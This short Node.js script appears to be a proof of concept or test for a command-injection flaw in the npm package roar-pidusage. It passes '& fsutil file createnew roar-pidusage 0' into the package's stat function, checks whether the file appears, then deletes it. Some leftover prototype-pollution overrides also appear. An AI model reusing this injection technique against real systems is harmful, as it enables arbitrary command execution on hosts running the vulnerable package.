var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const os = require('os');
os.platform = () => {
    return 'freebsd';
};
const roar_pidusage = require('roar-pidusage');
const fs = require('fs');
const path = './roar-pidusage';
roar_pidusage.stat('& fsutil file createnew roar-pidusage 0', function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});